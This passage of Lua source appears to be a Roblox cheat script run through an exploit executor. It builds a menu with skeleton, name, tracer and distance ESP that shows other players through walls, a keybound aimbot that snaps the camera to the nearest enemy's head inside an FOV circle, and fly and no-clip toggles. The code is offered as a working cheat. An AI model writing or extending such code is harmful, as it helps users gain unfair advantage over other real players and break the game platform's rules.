                local fs = st.AbsoluteSize
                local rx = math.clamp((ps.X - fp.X) / fs.X, 0, 1)
                local vl = math.floor(rx * 255)
                sv.Size = UDim2.new(vl / 255, 0, 1, 0)
                sh.Position = UDim2.new(vl / 255, 0, 0.5, 0)
                sl.Text = l .. ": " .. vl
                uf(vl)
            end
            
            sh.InputBegan:Connect(function(inp)
                if inp.UserInputType == Enum.UserInputType.MouseButton1 then
                    dr = true
                    end
            end)
            
            st.InputBegan:Connect(function(inp)
                if inp.UserInputType == Enum.UserInputType.MouseButton1 then
                    dr = true
                    update()
                end
            end)
            
            uis.InputChanged:Connect(function(inp)
                if dr and inp.UserInputType == Enum.UserInputType.MouseMovement then
                    update()
            end
        end)
        
            uis.InputEnded:Connect(function(inp)
                if inp.UserInputType == Enum.UserInputType.MouseButton1 then
                    dr = false
                end
            end)
        end

        local cf = Instance.new("Frame")
        cf.Size = UDim2.new(1, 0, 0, 40)
        cf.BackgroundTransparency = 1
        cf.Parent = scrollFrame
        
        local cl = Instance.new("TextLabel")
        cl.Size = UDim2.new(1, 0, 0, 20)
        cl.BackgroundTransparency = 1
        cl.Text = "TRACER COLOR:"
        cl.TextColor3 = Color3.fromRGB(255, 255, 255)
        cl.TextSize = 13
        cl.Font = Enum.Font.GothamBold
        cl.TextXAlignment = Enum.TextXAlignment.Left
        cl.Parent = cf
        
        local cc = _G.ESP_Settings.LineColor or Color3.fromRGB(255, 255, 255)
        local cv = math.floor((cc.R * 255 + cc.G * 255 + cc.B * 255) / 3)
        
        createColorSlider(cf, "RGB", cv, function(v)
            cv = v
            _G.ESP_Settings.LineColor = Color3.fromRGB(cv, cv, cv)
            for p, el in pairs(_G.ESP_Elements or {}) do
                if el.line then
                    el.line.Color = _G.ESP_Settings.LineColor
                end
            end
        end)

        local ccf = Instance.new("Frame")
        ccf.Size = UDim2.new(1, 0, 0, 40)
        ccf.BackgroundTransparency = 1
        ccf.Parent = scrollFrame
        
        local ccl = Instance.new("TextLabel")
        ccl.Size = UDim2.new(1, 0, 0, 20)
        ccl.BackgroundTransparency = 1
        ccl.Text = "ENEMY COLOR:"
        ccl.TextColor3 = Color3.fromRGB(255, 255, 255)
        ccl.TextSize = 13
        ccl.Font = Enum.Font.GothamBold
        ccl.TextXAlignment = Enum.TextXAlignment.Left
        ccl.Parent = ccf
        
        local ccc = _G.ESP_Settings.ChamsColor or Color3.fromRGB(255, 255, 255)
        local ccv = math.floor((ccc.R * 255 + ccc.G * 255 + ccc.B * 255) / 3)
        
        createColorSlider(ccf, "RGB", ccv, function(v)
            ccv = v
            _G.ESP_Settings.ChamsColor = Color3.fromRGB(ccv, ccv, ccv)

            if _G.SkeletonESPLines then
                for player, skeletonData in pairs(_G.SkeletonESPLines) do
                    if skeletonData and skeletonData.lines then
                        local isAlly = (player.Team ~= nil and lp.Team ~= nil and player.Team == lp.Team)
                        if not isAlly then
                            for _, line in pairs(skeletonData.lines) do
                                if line then
                                    line.Color = _G.ESP_Settings.ChamsColor
                                end
                            end
                        end
                    end
                end
            end
        end)

        local cacf = Instance.new("Frame")
        cacf.Size = UDim2.new(1, 0, 0, 40)
        cacf.BackgroundTransparency = 1
        cacf.Parent = scrollFrame
        
        local cacl = Instance.new("TextLabel")
        cacl.Size = UDim2.new(1, 0, 0, 20)
        cacl.BackgroundTransparency = 1
        cacl.Text = "ALLY COLOR:"
        cacl.TextColor3 = Color3.fromRGB(255, 255, 255)
        cacl.TextSize = 13
        cacl.Font = Enum.Font.GothamBold
        cacl.TextXAlignment = Enum.TextXAlignment.Left
        cacl.Parent = cacf
        
        local cacc = _G.ESP_Settings.ChamsAllyColor or Color3.fromRGB(0, 170, 255)
        local cacv = math.floor((cacc.R * 255 + cacc.G * 255 + cacc.B * 255) / 3)
        
        createColorSlider(cacf, "RGB", cacv, function(v)
            cacv = v
            _G.ESP_Settings.ChamsAllyColor = Color3.fromRGB(cacv, cacv, cacv)

            if _G.SkeletonESPLines then
                for player, skeletonData in pairs(_G.SkeletonESPLines) do
                    if skeletonData and skeletonData.lines then
                        local isAlly = (player.Team ~= nil and lp.Team ~= nil and player.Team == lp.Team)
                        if isAlly then
                            for _, line in pairs(skeletonData.lines) do
                                if line then
                                    line.Color = _G.ESP_Settings.ChamsAllyColor
                                end
                            end
                        end
                    end
                end
            end
        end)

        listLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
            scrollFrame.CanvasSize = UDim2.new(0, 0, 0, listLayout.AbsoluteContentSize.Y + 10)
        end)

        task.wait()
        scrollFrame.CanvasSize = UDim2.new(0, 0, 0, listLayout.AbsoluteContentSize.Y + 10)
    end)

    local chamsEnabled = false
    Components.CreateToggle(contents["AIM UNIVERSAL"], "SKELETON ESP", false, function(st)
        chamsEnabled = st
        if st then

            spawn(function()
                task.wait(0.1)
                for _, p in pairs(ps:GetPlayers()) do
                    if p ~= lp and p.Character then
                        createSkeletonLines(p)
                    end
                end
            end)
        else

            if _G.SkeletonESPLines then
                for player, skeletonData in pairs(_G.SkeletonESPLines) do
                    if skeletonData and skeletonData.lines then
                        for _, line in pairs(skeletonData.lines) do
                            pcall(function()
                                line.Visible = false
                            end)
                        end
                    end
                end
            end
        end
    end)

    _G.SkeletonESPLines = _G.SkeletonESPLines or {}

    local function getBonePosition(character, boneName)
        local bone = character:FindFirstChild(boneName)
        if bone and bone:IsA("BasePart") then
            return bone.Position
        end
        return nil
    end

    local function createSkeletonLines(player)
        if _G.SkeletonESPLines[player] and _G.SkeletonESPLines[player].lines then

            for _, line in pairs(_G.SkeletonESPLines[player].lines) do
                pcall(function()
                    line.Visible = false
                    line:Remove()
                end)
            end
        end
        
        local character = player.Character
        if not character then return end

        if not Drawing or not Drawing.new then
            warn("Drawing library not available for Skeleton ESP")
            return
        end
        
        local isAlly = (player.Team ~= nil and lp.Team ~= nil and player.Team == lp.Team)
        local color = (isAlly and (_G.ESP_Settings.ChamsAllyColor or Color3.fromRGB(0, 170, 255))) or (_G.ESP_Settings.ChamsColor or Color3.fromRGB(255, 255, 255))

        local isModernModel = character:FindFirstChild("UpperTorso") ~= nil
        local connections
        
        if isModernModel then

            connections = {
                {"Head", "UpperTorso"},
                {"UpperTorso", "LeftUpperArm"},
                {"UpperTorso", "RightUpperArm"},
                {"LeftUpperArm", "LeftLowerArm"},
                {"LeftLowerArm", "LeftHand"},
                {"RightUpperArm", "RightLowerArm"},
                {"RightLowerArm", "RightHand"},
                {"UpperTorso", "LowerTorso"},
                {"LowerTorso", "LeftUpperLeg"},
                {"LowerTorso", "RightUpperLeg"},
                {"LeftUpperLeg", "LeftLowerLeg"},
                {"LeftLowerLeg", "LeftFoot"},
                {"RightUpperLeg", "RightLowerLeg"},
                {"RightLowerLeg", "RightFoot"},
            }
        else

            connections = {
                {"Head", "Torso"},
                {"Torso", "Left Arm"},
                {"Torso", "Right Arm"},
                {"Torso", "Left Leg"},
                {"Torso", "Right Leg"},
            }
        end
        
        local lines = {}
        for _, conn in pairs(connections) do
            local success, line = pcall(function()
                return Drawing.new("Line")
            end)
            
            if success and line then
                line.Visible = false
                line.Thickness = (_G.ESP_Settings.LineThickness or 1.5) * 1.8
                line.Color = color
                line.Transparency = 0.3
                table.insert(lines, line)
            else
                warn("Failed to create skeleton line: " .. tostring(line))
            end
        end
        
        if #lines == 0 then
            warn("No skeleton lines created for " .. player.Name)
            return
        end

        _G.SkeletonESPLines[player] = {lines = lines, connections = connections}
    end


    if not _G.SkeletonESPConnection then
        local frameSkip = 0
        local frameSkipCount = 2
        _G.SkeletonESPColorCache = _G.SkeletonESPColorCache or {}
        local colorCache = _G.SkeletonESPColorCache
        
        _G.SkeletonESPConnection = rs.RenderStepped:Connect(function()
            if not chamsEnabled then 

                if _G.SkeletonESPLines then
                    for player, skeletonData in pairs(_G.SkeletonESPLines) do
                        if skeletonData and skeletonData.lines then
                            for _, line in pairs(skeletonData.lines) do
                                if line then
                                    line.Visible = false
                                end
                            end
                        end
                    end
                end
                return 
            end

            frameSkip = frameSkip + 1
            if frameSkip < frameSkipCount then
                return
            end
            frameSkip = 0
            
            local camera = workspace.CurrentCamera
            if not camera then return end
            
            local cameraPos = camera.CFrame.Position
            local maxDistance = (_G.ESP_Settings and _G.ESP_Settings.MaxDistance) or 2000
            
            for _, player in pairs(ps:GetPlayers()) do
                if player ~= lp and player.Character then
                    local character = player.Character
                    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
                    local shouldSkip = false

                    if humanoidRootPart then
                        local distance = (humanoidRootPart.Position - cameraPos).Magnitude
                        if distance > maxDistance then

                            if _G.SkeletonESPLines[player] and _G.SkeletonESPLines[player].lines then
                                for _, line in pairs(_G.SkeletonESPLines[player].lines) do
                                    if line then
                                        line.Visible = false
                                    end
                                end
                            end
                            shouldSkip = true
                        end
                    end
                    
                    if not shouldSkip then

                        if not _G.SkeletonESPLines[player] then
                            createSkeletonLines(player)
                        end
                        
                        local skeletonData = _G.SkeletonESPLines[player]
                        if skeletonData and skeletonData.lines then
                            local lines = skeletonData.lines
                            local connections = skeletonData.connections

                            local isAlly = (player.Team ~= nil and lp.Team ~= nil and player.Team == lp.Team)
                            local newColor = (isAlly and (_G.ESP_Settings.ChamsAllyColor or Color3.fromRGB(0, 170, 255))) or (_G.ESP_Settings.ChamsColor or Color3.fromRGB(255, 255, 255))

                            if not colorCache[player] or colorCache[player] ~= newColor then
                                colorCache[player] = newColor
                                for _, line in pairs(lines) do
                                    if line then
                                        line.Color = newColor
                                    end
                                end
                            end

                            local isModernModel = character:FindFirstChild("UpperTorso") ~= nil
                            if isModernModel and #connections == 5 then

                                createSkeletonLines(player)
                                skeletonData = _G.SkeletonESPLines[player]
                                if skeletonData then
                                    lines = skeletonData.lines
                                    connections = skeletonData.connections
                                end
                            elseif not isModernModel and #connections == 14 then

                                createSkeletonLines(player)
                                skeletonData = _G.SkeletonESPLines[player]
                                if skeletonData then
                                    lines = skeletonData.lines
                                    connections = skeletonData.connections
                                end
                            end
                            
                            local lineIndex = 1
                            for _, conn in pairs(connections) do
                                if lineIndex > #lines then break end
                                
                                local fromBone = getBonePosition(character, conn[1])
                                local toBone = getBonePosition(character, conn[2])
                                
                                if fromBone and toBone then
                                    local success1, fromPos, fromVisible = pcall(function()
                                        return camera:WorldToViewportPoint(fromBone)
                                    end)
                                    local success2, toPos, toVisible = pcall(function()
                                        return camera:WorldToViewportPoint(toBone)
                                    end)
                                    
                                    if success1 and success2 and fromVisible and toVisible then
                                        local line = lines[lineIndex]
                                        if line then
                                            line.From = Vector2.new(fromPos.X, fromPos.Y)
                                            line.To = Vector2.new(toPos.X, toPos.Y)
                                            line.Visible = true
                                        end
                                    else
                                        if lines[lineIndex] then
                                            lines[lineIndex].Visible = false
                                        end
                                    end
                                else
                                    if lines[lineIndex] then
                                        lines[lineIndex].Visible = false
                                    end
                                end
                                lineIndex = lineIndex + 1
                            end
                        end
                    end
                else

                    if _G.SkeletonESPLines[player] and _G.SkeletonESPLines[player].lines then
                        for _, line in pairs(_G.SkeletonESPLines[player].lines) do
                            if line then
                                line.Visible = false
                            end
                        end
                    end

                    colorCache[player] = nil
                end
            end
        end)
    end

    spawn(function()
        while true do
            if chamsEnabled then
                task.wait(1)
                for _, p in pairs(ps:GetPlayers()) do
                    if p ~= lp and p.Character and not _G.SkeletonESPLines[p] then
                        createSkeletonLines(p)
                    end
                end
            else
                task.wait(2)
            end
        end
    end)

    ps.PlayerAdded:Connect(function(p)
        if p.Character and chamsEnabled then
            task.wait(0.5)
            createSkeletonLines(p)
        end
        
        p.CharacterAdded:Connect(function(ch)
            if chamsEnabled then
                task.wait(0.5)
                createSkeletonLines(p)
            end
        end)
    end)

    ps.PlayerRemoving:Connect(function(p)
        if _G.SkeletonESPLines[p] and _G.SkeletonESPLines[p].lines then
            for _, line in pairs(_G.SkeletonESPLines[p].lines) do
                pcall(function()
                    line.Visible = false
                    line:Remove()
                end)
            end
            _G.SkeletonESPLines[p] = nil
        end

        if _G.SkeletonESPColorCache then
            _G.SkeletonESPColorCache[p] = nil
        end
    end)

    _G.NameESPEnabled = false
    _G.ESP_Elements = {}
    
    Components.CreateToggle(contents["AIM UNIVERSAL"], "NAME & LINES ESP", false, function(st)
        _G.NameESPEnabled = st
        if not st then
            if _G.ESPLineConnection then
                _G.ESPLineConnection:Disconnect()
                _G.ESPLineConnection = nil
            end
            
            for p, el in pairs(_G.ESP_Elements) do
                if el.gui then pcall(function() el.gui:Destroy() end) end
                if el.line then 
                    pcall(function() 
                        el.line.Visible = false
                        el.line:Remove() 
                    end)
                end
            end
            _G.ESP_Elements = {}
        else
            if not _G.ESPLineConnection then
                _G.ESPLineConnection = rs.RenderStepped:Connect(function()
                    if _G.NameESPEnabled and lp.Character and lp.Character:FindFirstChild("HumanoidRootPart") then
                        local ca = workspace.CurrentCamera
                        local ch = lp.Character
                        local hr = ch:FindFirstChild("HumanoidRootPart")
                        
                        local cs
                        if hr then
                            local sc, ps, vs = pcall(function()
                                return ca:WorldToViewportPoint(hr.Position)
                            end)
                            if sc and vs then
                                cs = Vector2.new(ps.X, ps.Y)
                            end
                        end
                        
                        for p, el in pairs(_G.ESP_Elements) do
                            if el.line and p.Character and p.Character:FindFirstChild("Head") then
                                local sc, sp, os = pcall(function()
                                    local ps, vs = ca:WorldToViewportPoint(p.Character.Head.Position)
                                    return ps, vs
                                end)
                                
                                if sc and os and cs then
                                    el.line.From = cs
                                    el.line.To = Vector2.new(sp.X, sp.Y)
                                    el.line.Visible = true
                                else
                                    el.line.Visible = false
                                end
                            else
                                if el.line then el.line.Visible = false end
                            end
                        end
                    else
                        for _, el in pairs(_G.ESP_Elements) do
                            if el.line then el.line.Visible = false end
                        end
                    end
                end)
            end
        end
    end)
    _G.ESPLineConnection = _G.ESPLineConnection or nil

    local function formatPlayerName(player, format)
        local displayName = player.DisplayName
        local username = player.Name
        
        if format == "display" then
            return displayName
        elseif format == "username" then
            return username
        else

            if displayName == username then
                return displayName
            end

            return displayName .. " (@" .. username .. ")"
        end
    end

    local lastFormat = nil
    local cachedFormat = nil
    
    spawn(function()
        local updateRate = 0.15
        local frameCounter = 0
        local updateThrottle = 2
        
        while task.wait(updateRate) do
            if _G.NameESPEnabled and lp.Character and lp.Character:FindFirstChild("HumanoidRootPart") then

                local espSettings = _G.ESP_Settings or {}
                local md = espSettings.MaxDistance or 2000
                local currentFormat = espSettings.NameFormat or "both"

                if currentFormat ~= cachedFormat then
                    cachedFormat = currentFormat
                end
                
                local ap = {}
                local localChar = lp.Character
                local localHRP = localChar:FindFirstChild("HumanoidRootPart")
                if localHRP then
                    local localPos = localHRP.Position

                    local players = ps:GetPlayers()
                    for i = 1, #players do
                        local p = players[i]
                        if p ~= lp then
                            local pChar = p.Character
                            if pChar then
                                local pHead = pChar:FindFirstChild("Head")
                                local pHRP = pChar:FindFirstChild("HumanoidRootPart")
                                if pHead and pHRP then

                                    local distance = (localPos - pHRP.Position).Magnitude
                                    if distance <= md then
                                        ap[p] = true
                                        local el = _G.ESP_Elements[p]

                                        if not el or not el.gui or not el.gui.Parent then
                                            local eg = Instance.new("BillboardGui")
                                            eg.Name = "NameESP"
                                            eg.Adornee = pHead
                                            eg.Size = UDim2.new(0, 200, 0, 30)
                                            eg.StudsOffset = Vector3.new(0, 2.5, 0)
                                            eg.AlwaysOnTop = true
                                            eg.ResetOnSpawn = false
                                            
                                            local lb = Instance.new("TextLabel")
                                            lb.Size = UDim2.new(1, 0, 1, 0)
                                            lb.BackgroundTransparency = 1
                                            lb.Text = formatPlayerName(p, cachedFormat)
                                            lb.Font = Enum.Font.GothamBold
                                            lb.TextSize = 14
                                            lb.TextColor3 = Color3.fromRGB(255, 255, 255)
                                            lb.TextStrokeTransparency = 0
                                            lb.TextWrapped = true
                                            lb.Parent = eg
                                            eg.Parent = pHead
                                            
                                            local ln = Drawing.new("Line")
                                            ln.Visible = false
                                            ln.Thickness = espSettings.LineThickness or 1.5
                                            ln.Color = espSettings.LineColor or Color3.fromRGB(255, 255, 255)
                                            ln.Transparency = 0.3
                                            
                                            _G.ESP_Elements[p] = {gui = eg, line = ln, cachedName = lb.Text}
                                        else

                                            frameCounter = frameCounter + 1
                                            if frameCounter >= updateThrottle then
                                                frameCounter = 0

                                                local cachedName = el.cachedName
                                                if cachedName then
                                                    local newName = formatPlayerName(p, cachedFormat)
                                                    if newName ~= cachedName then
                                                        local textLabel = el.gui:FindFirstChild("TextLabel")
                                                        if textLabel then
                                                            textLabel.Text = newName
                                                            _G.ESP_Elements[p].cachedName = newName
                                                        end
                                                    end
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end

                for p, el in pairs(_G.ESP_Elements) do
                    if not ap[p] then
                        if el.gui then pcall(function() el.gui:Destroy() end) end
                        if el.line then pcall(function() el.line:Remove() end) end
                        _G.ESP_Elements[p] = nil
                    else
                        local sc, d = pcall(function()
                            if p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
                                return (lp.Character.HumanoidRootPart.Position - p.Character.HumanoidRootPart.Position).Magnitude
                            end
                            return 9999
                        end)
                        
                        if sc then
                            if d > md and el.gui then
                                el.gui.Enabled = false
                            elseif el.gui then
                                el.gui.Enabled = true
                            end
                        end
                    end
                end
            end
        end
    end)

    _G.AimbotSettings = _G.AimbotSettings or {
        Enabled = false,
        Keybind = Enum.KeyCode.E,
        Smoothness = 0.3,
        FOV = 200,
        ShowFOV = false,
        MaxDistance = 2000,
        TargetBone = "Head",
        TeamCheck = false,
        FriendCheck = false,        
        VisibleCheck = false,
        SpectatorCheck = true
    }
    
    
    
    
    local fg = Instance.new("ScreenGui")
    fg.Name = "AimbotFOVCircle"
    fg.ResetOnSpawn = false
    fg.Parent = pg
    
    local fc = Instance.new("Frame")
    fc.Name = "FOVCircle"
    fc.Size = UDim2.new(0, _G.AimbotSettings.FOV, 0, _G.AimbotSettings.FOV)
    fc.Position = UDim2.new(0.5, -_G.AimbotSettings.FOV/2, 0.5, -_G.AimbotSettings.FOV/2)
    fc.BackgroundTransparency = 1
    fc.BorderSizePixel = 0
    fc.Parent = fg
    
    local fb = Instance.new("UIStroke")
    fb.Color = Color3.fromRGB(255, 255, 255)
    fb.Thickness = 2
    fb.Parent = fc
    
    local fn = Instance.new("UICorner")
    fn.CornerRadius = UDim.new(1, 0)
    fn.Parent = fc
    
    _G.UpdateFOVCircle = function()
        fc.Size = UDim2.new(0, _G.AimbotSettings.FOV, 0, _G.AimbotSettings.FOV)
        fc.Position = UDim2.new(0.5, -_G.AimbotSettings.FOV/2, 0.5, -_G.AimbotSettings.FOV/2)
        fc.Visible = _G.AimbotSettings.ShowFOV
    end

    _G.UpdateFOVCircle()
    
    local ih = false
    local cn = nil
    
    local kd = uis.InputBegan:Connect(function(inp, gp)
        if not gp and inp.KeyCode == _G.AimbotSettings.Keybind and _G.AimbotSettings.Enabled then
            ih = true
            
            cn = rs.Heartbeat:Connect(function()
                if ih and _G.AimbotSettings.Enabled then
                    local ca = workspace.CurrentCamera
                    local cp = nil
                    local cd = math.huge
                    local sc = Vector2.new(ca.ViewportSize.X / 2, ca.ViewportSize.Y / 2)
                    
                    if lp.Character and lp.Character:FindFirstChild("HumanoidRootPart") and lp.Character:FindFirstChild("Humanoid") then
                        local ah = lp.Character.Humanoid
                        if ah.Health <= 0 then
                            return
                        end
                        for _, p in pairs(ps:GetPlayers()) do
                            if p ~= lp and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
                                local hu = p.Character:FindFirstChild("Humanoid")
                                if hu and hu.Health > 0 then
                                    if not (_G.AimbotSettings.TeamCheck and p.Team == lp.Team) then
                                        if not (_G.AimbotSettings.FriendCheck and lp:IsFriendsWith(p.UserId)) then
                                            local hr = p.Character.HumanoidRootPart
                                            local dt = (lp.Character.HumanoidRootPart.Position - hr.Position).Magnitude
                                
                                            if dt <= _G.AimbotSettings.MaxDistance then
                                                local sp, os = ca:WorldToViewportPoint(hr.Position)
                                    
                                                if os then
                                                    local sx = Vector2.new(sp.X, sp.Y)
                                                    local df = (sx - sc).Magnitude
                                        
                                                    if df <= (_G.AimbotSettings.FOV / 2) then
                                                        if df < cd then
                                                            cp = p
                                                            cd = df
                                            end
                                        end
                                    end
                                end
                            end
                                    end
                                end
                            end
                        end
                        
                        if cp and cp.Character then
                            local tp
                            
                            if _G.AimbotSettings.TargetBone == "Head" then
                                local hd = cp.Character:FindFirstChild("Head")
                                tp = hd and hd.Position or cp.Character.HumanoidRootPart.Position + Vector3.new(0, 2, 0)
                            elseif _G.AimbotSettings.TargetBone == "Torso" then
                                local to = cp.Character:FindFirstChild("Torso")
                                tp = to and to.Position or cp.Character.HumanoidRootPart.Position
                            else
                                tp = cp.Character.HumanoidRootPart.Position
                            end
                            
                            local cf = ca.CFrame
                            local tc = CFrame.lookAt(cf.Position, tp)
                            local nc = cf:Lerp(tc, _G.AimbotSettings.Smoothness)
                            ca.CFrame = nc
                        end
                    end
                end
            end)
        end
    end)
    
    local ku = uis.InputEnded:Connect(function(inp, gp)
        if not gp and inp.KeyCode == _G.AimbotSettings.Keybind then
            ih = false
            
            if cn then
                cn:Disconnect()
                cn = nil
            end
        end
    end)

    spawn(function()
        while true do
            if _G.AimbotSettings.Enabled or _G.AimbotSettings.ShowFOV then
                _G.UpdateFOVCircle()
                wait(0.2)
            else
                wait(1)
            end
        end
    end)

    Components.CreateToggle(contents["AIM UNIVERSAL"], "DISTANCE ESP", false, function(st)
        if st then
            _G.DistanceESPEnabled = true
            _G.DistanceESPLabels = {}
            
            local function cr(p)
                if p == lp then return end
                if not p.Character then return end
                
                local ch = p.Character
                local hd = ch:FindFirstChild("Head")
                if not hd then return end
                
                local bb = Instance.new("BillboardGui")
                bb.Name = "DistanceESP_" .. p.Name
                bb.Adornee = hd
                bb.Size = UDim2.new(0, 100, 0, 30)
                bb.StudsOffset = Vector3.new(0, 3, 0)
                bb.AlwaysOnTop = true
                bb.Parent = hd
                
                local lb = Instance.new("TextLabel")
                lb.Size = UDim2.new(1, 0, 1, 0)
                lb.BackgroundTransparency = 1
                lb.Text = "0m"
                lb.TextColor3 = Color3.fromRGB(255, 255, 255)
                lb.TextSize = 14
                lb.Font = Enum.Font.GothamBold
                lb.TextStrokeTransparency = 0.5
                lb.Parent = bb
                
                _G.DistanceESPLabels[p] = {
                    billboard = bb,
                    label = lb,
                    player = p
                }
            end
            
            for _, p in pairs(ps:GetPlayers()) do
                if p ~= lp then
                    cr(p)
                end
            end
            
            _G.DistanceESPPlayerAdded = ps.PlayerAdded:Connect(function(p)
                if _G.DistanceESPEnabled then
                    task.wait(1)
                    if p ~= lp then
                        cr(p)
                    end
                end
            end)
            
            _G.DistanceESPCharacterAdded = {}
            for _, p in pairs(ps:GetPlayers()) do
                if p ~= lp then
                    _G.DistanceESPCharacterAdded[p] = p.CharacterAdded:Connect(function(ch)
                        if _G.DistanceESPEnabled then
                            task.wait(0.5)
                            cr(p)
                        end
                    end)
                end
            end
            
            local ut = 0
            _G.DistanceESPUpdateConnection = rs.Heartbeat:Connect(function()
                if not _G.DistanceESPEnabled then return end
                
                ut = ut + 1
                if ut % 2 ~= 0 then return end
                
                local ch = lp.Character
                if not ch then return end
                local hr = ch:FindFirstChild("HumanoidRootPart")
                if not hr then return end
                
                local mp = hr.Position
                local espSettings = _G.ESP_Settings or {}
                local maxDistance = espSettings.MaxDistance or 2000
                
                for p, dd in pairs(_G.DistanceESPLabels) do
                    if p == lp then
                        if dd.billboard then
                            dd.billboard:Destroy()
                        end
                        _G.DistanceESPLabels[p] = nil
                    else
                        local pc = p.Character
                        if pc then
                            local pr = pc:FindFirstChild("HumanoidRootPart")
                            if pr then
                                local d = math.floor((mp - pr.Position).Magnitude)

                                if d <= maxDistance then
                                    dd.label.Text = d .. "m"
                                    if dd.billboard then
                                        dd.billboard.Enabled = true
                                    end
                                else

                                    if dd.billboard then
                                        dd.billboard.Enabled = false
                                    end
                                end
                            else
                                if dd.billboard then
                                    dd.billboard:Destroy()
                                end
                                _G.DistanceESPLabels[p] = nil
                            end
                        else
                            if dd.billboard then
                                dd.billboard:Destroy()
                            end
                            _G.DistanceESPLabels[p] = nil
                        end
                    end
                end
            end)
        else

            _G.DistanceESPEnabled = false
            
            if _G.DistanceESPLabels then
                for _, dd in pairs(_G.DistanceESPLabels) do
                    if dd.billboard and dd.billboard.Parent then
                        dd.billboard:Destroy()
                    end
                end
                _G.DistanceESPLabels = {}
            end
            
            if _G.DistanceESPUpdateConnection then
                _G.DistanceESPUpdateConnection:Disconnect()
                _G.DistanceESPUpdateConnection = nil
            end
            
            if _G.DistanceESPPlayerAdded then
                _G.DistanceESPPlayerAdded:Disconnect()
                _G.DistanceESPPlayerAdded = nil
            end
            
            if _G.DistanceESPCharacterAdded then
                for _, cn in pairs(_G.DistanceESPCharacterAdded) do
                    if cn then
                        cn:Disconnect()
                    end
                end
                _G.DistanceESPCharacterAdded = {}
            end
        end
    end)

    Components.CreateLabel(contents.PLAYER, "PLAYER FEATURES", Config.Theme.Accent)
    
    Components.CreateToggle(contents.PLAYER, "FLY MODE", false, function(st)
        if st then
            if lp.Character and lp.Character:FindFirstChild("Humanoid") and lp.Character:FindFirstChild("HumanoidRootPart") then
                local hu = lp.Character.Humanoid
                local rp = lp.Character.HumanoidRootPart
                
                _G.OriginalWalkSpeed = hu.WalkSpeed
                _G.OriginalJumpPower = hu.JumpPower
                _G.OriginalHipHeight = hu.HipHeight
                
                local bv = Instance.new("BodyVelocity")
                bv.Name = "FlyVelocity"
                bv.MaxForce = Vector3.new(4000, 4000, 4000)
                bv.Velocity = Vector3.new(0, 0, 0)
                bv.Parent = rp
                
                local bav = Instance.new("BodyAngularVelocity")
                bav.Name = "FlyAngularVelocity"
                bav.MaxTorque = Vector3.new(4000, 4000, 4000)
                bav.AngularVelocity = Vector3.new(0, 0, 0)
                bav.Parent = rp
                
                hu.WalkSpeed = 0
                hu.JumpPower = 0
                hu.HipHeight = 0
                hu.PlatformStand = true
                
                local bs = 50
                local sb = 2.5
                local fa = 0.8
                local cv = Vector3.new(0, 0, 0)
                
                _G.FlyConnection = rs.Heartbeat:Connect(function()
                    if lp.Character and lp.Character:FindFirstChild("HumanoidRootPart") and lp.Character:FindFirstChild("Humanoid") then
                        local rt = lp.Character.HumanoidRootPart
                        local hd = lp.Character.Humanoid
                        local ca = workspace.CurrentCamera
                        
                        local ky = {
                            W = uis:IsKeyDown(Enum.KeyCode.W),
                            A = uis:IsKeyDown(Enum.KeyCode.A),
                            S = uis:IsKeyDown(Enum.KeyCode.S),
                            D = uis:IsKeyDown(Enum.KeyCode.D),
                            Space = uis:IsKeyDown(Enum.KeyCode.Space),
                            LeftShift = uis:IsKeyDown(Enum.KeyCode.LeftShift),
                            RightShift = uis:IsKeyDown(Enum.KeyCode.RightShift)
                        }
                        
                        local ish = ky.LeftShift or ky.RightShift
                        local cfs = ish and (bs * sb) or bs
                        
                        local md = Vector3.new(0, 0, 0)
                        
                        if ky.W then
                            md = md + ca.CFrame.LookVector
                        end
                        if ky.S then
                            md = md - ca.CFrame.LookVector
                        end
                        
                        if ky.A then
                            md = md - ca.CFrame.RightVector
                        end
                        if ky.D then
                            md = md + ca.CFrame.RightVector
                        end
                        
                        if ky.Space then
                            md = md + Vector3.new(0, 1, 0)
                        end
                        if ky.RightShift and not ky.LeftShift then
                            md = md - Vector3.new(0, 1, 0)
                        end
                        
                        if md.Magnitude > 0 then
                            md = md.Unit * cfs
                        end
                        
                        cv = cv:Lerp(md, fa)
                        
                        if rt:FindFirstChild("FlyVelocity") then
                            rt.FlyVelocity.Velocity = cv
                        end
                        
                        if rt:FindFirstChild("FlyAngularVelocity") then
                            local tcf = CFrame.lookAt(rt.Position, rt.Position + ca.CFrame.LookVector)
                            local rd = rt.CFrame:ToObjectSpace(tcf)
                            local av = Vector3.new(rd:ToEulerAnglesXYZ()) * 2
                            rt.FlyAngularVelocity.AngularVelocity = av
                        end
                    end
                end)
            end
        else
            if _G.FlyConnection then
                _G.FlyConnection:Disconnect()
                _G.FlyConnection = nil
            end
            
            if lp.Character and lp.Character:FindFirstChild("HumanoidRootPart") and lp.Character:FindFirstChild("Humanoid") then
                local rt = lp.Character.HumanoidRootPart
                local hu = lp.Character.Humanoid
                
                if rt:FindFirstChild("FlyVelocity") then
                    rt.FlyVelocity:Destroy()
                end
                if rt:FindFirstChild("FlyAngularVelocity") then
                    rt.FlyAngularVelocity:Destroy()
                end
                
                    if _G.OriginalWalkSpeed then
                    hu.WalkSpeed = _G.OriginalWalkSpeed
                    end
                    if _G.OriginalJumpPower then
                    hu.JumpPower = _G.OriginalJumpPower
                    end
                    if _G.OriginalHipHeight then
                    hu.HipHeight = _G.OriginalHipHeight
                    end
                hu.PlatformStand = false
                
                task.wait(0.1)
                if hu then
                    hu:ChangeState(Enum.HumanoidStateType.FallingDown)
                    task.wait(0.1)
                    hu:ChangeState(Enum.HumanoidStateType.GettingUp)
                end
            end
        end
    end)
    Components.CreateToggle(contents.PLAYER, "NO CLIP", false, function(st)
        if st then
            if lp.Character then
                for _, pt in pairs(lp.Character:GetDescendants()) do
                    if pt:IsA("BasePart") then
                        pt.CanCollide = false
                    end
                end
                
                _G.NoClipConnection = rs.Stepped:Connect(function()
                    if lp.Character then
                        for _, pt in pairs(lp.Character:GetDescendants()) do
                            if pt:IsA("BasePart") and pt.CanCollide then
                                pt.CanCollide = false
                            end
                        end
                    end
                end)
                
                lp.CharacterAdded:Connect(function(ch)
                    task.wait(0.1)
                    for _, pt in pairs(ch:GetDescendants()) do
                        if pt:IsA("BasePart") then
                            pt.CanCollide = false
                        end
                    end
                end)
            end
        else
            if _G.NoClipConnection then
                _G.NoClipConnection:Disconnect()
